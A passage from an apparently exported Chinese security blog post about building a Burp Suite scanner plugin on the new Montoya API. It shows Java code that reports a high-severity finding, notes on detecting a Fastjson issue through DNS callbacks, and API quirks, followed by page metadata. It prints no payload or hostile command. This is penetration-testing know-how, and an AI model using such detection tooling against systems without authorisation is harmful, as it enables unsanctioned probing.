class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ol start=\"5\">\n<li>问题展示</li>\n</ol>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">ExampleAudit</span> auditIssue <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ExampleAudit</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Example\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Example detail\"</span><span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">httpService</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">MarkedHttpRequestResponse</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>httpRequestResponse<span class=\"token punctuation\">.</span><span class=\"token function\">withNoMarkers</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> httpRequestResponse1<span class=\"token punctuation\">.</span><span class=\"token function\">withNoMarkers</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">AuditIssueSeverity</span><span class=\"token punctuation\">.</span>HIGH<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AuditIssueConfidence</span><span class=\"token punctuation\">.</span>CERTAIN<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nauditIssues<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>auditIssue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>至此一个<code>burp</code>插件算是完成了。</p>\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><h3 id=\"DNS\"><a href=\"#DNS\" class=\"headerlink\" title=\"DNS\"></a>DNS</h3><p>  在检测<code>dns</code>记录的时候遇到了一个问题，DNS数据包中<code>.</code>并不是<code>ord('.')</code>的格式</p>\n<p><img src=\"https://wiki-1258274765.cos.ap-nanjing.myqcloud.com/wiki/img1667114171212.png\"></p>\n<p>  为了准确识别，采用了<code>fastjson83</code>而非<code>fastjson83.payload</code></p>\n<h3 id=\"api问题\"><a href=\"#api问题\" class=\"headerlink\" title=\"api问题\"></a>api问题</h3><p>  目前新接口还在不断更新中，不是特别稳定。比如说文档中的<code>DnsDetails</code>会返回<code>ByteArray</code>类型<br><img src=\"https://wiki-1258274765.cos.ap-nanjing.myqcloud.com/wiki/img1667114430532.png\"><br>  但是目前最新的<code>burp</code>接口中还是<code>byte[]</code><br><img src=\"https://wiki-1258274765.cos.ap-nanjing.myqcloud.com/wiki/img1667114541690.jpg\"></p>\n","text":" Burp的新版本更新了新的API接口，刚好最近有写插件的想法，所以简单的了解了下。 简介 单从文档界面来看，结构清晰了不少-&gt;MontoyaApi 同时官方提供了一个demo 使用 与老版本类...","link":"","photos":[],"count_time":{"symbolsCount":"6.4k","symbolsTime":"6 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"BurpSuite","slug":"BurpSuite","count":2,"path":"api/tags/BurpSuite.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">使用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BE%8B\"><span class=\"toc-text\">实例</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">问题</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DNS\"><span class=\"toc-text\">DNS</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#api%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">api问题</span></a></li></ol></li></ol>","author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"qiling 框架IotFuzz之Boa","uid":"dda4d51b385ad6b8fb41614a58891fc8","slug":"Qiling partial fuzz I","date":"2023-01-30T04:38:45.000Z","updated":"2023-04-12T02:36:51.351Z","comments":true,"path":"api/articles/Qiling partial fuzz I.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/images.4wcohedooqg0.png","text":"qiling 框架IotFuzz之Boa前言最近在搞Iot的时候接触到Qiling框架，用了一段时间后感觉确实模拟功能挺强大的，还支持Fuzz，于是开始学习对Iot webserver这样的程序进行F...","link":"","photos":[],"count_time":{"symbolsCount":"20k","symbolsTime":"18 mins."},"categories":[{"name":"Fuzz","slug":"Fuzz","count":1,"path":"api/categories/Fuzz.json"}],"tags":[{"name":"Fuzz","slug":"Fuzz","count":4,"path":"api/tags/Fuzz.json"}],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"对Xray 5.6W条结果的简单分析","uid":"7865cd0898eb778742478bf73fa460c6","slug":"Xray数据分析","date":"2022-10-12T11:48:45.000Z","updated":"2023-04-12T02:36:51.351Z","comments":true,"path":"api/articles/Xray数据分析.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221012/image-20221009230905837.2jiiuh6lk5s0.png","text":"对Xray 5.6W条结果的简单分析 前言自动化扫描src已经做一段时间了，各类问题累计扫出来7.3w+，其中xray作为扫描漏洞的主力之一，上报了5.6w+问题 。目前应该是全网使用xray漏洞记录...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}